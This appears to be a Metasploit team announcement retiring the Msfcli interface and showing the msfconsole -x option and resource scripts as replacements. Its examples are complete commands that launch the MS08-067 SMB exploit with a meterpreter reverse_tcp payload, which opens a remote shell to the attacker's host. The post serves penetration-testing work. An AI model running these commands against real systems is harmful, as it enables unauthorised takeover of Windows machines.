Hi everyone,

 

This January, we made an announcement about the deprecation of Msfcli, the command line interface version for Metasploit. Today we are ready to say good-bye to it. Instead of Msfcli, we recommend using the -x option in Msfconsole. For example, here's how you can run MS08-067 in one line:

 

    ./msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run"  

 

You can also leverage things like resource scripts or even command alias to do less typing. Here's an example of how you would write a resource script to automate running MS08_067:

 

    use exploit/windows/smb/ms08_067_netapi  
    set RHOST [IP]  
    set PAYLOAD windows/meterpreter/reverse_tcp  
    set LHOST [IP]  
    run  

 

And then run it:

 

    ./msfconsole -r name_of_resource_script.rc  

 

Another way to run a resource script if you're in msfconsole already:

 

    msf > resource name_of_resource_script.rc  

 

If you have any questions, please feel free to create a discussion on SecurityStreet, or e-mail us at msfdev[at]metasploit.com. To submit a bug report or feature request, please go to Metasploit's Github repository. Thanks!
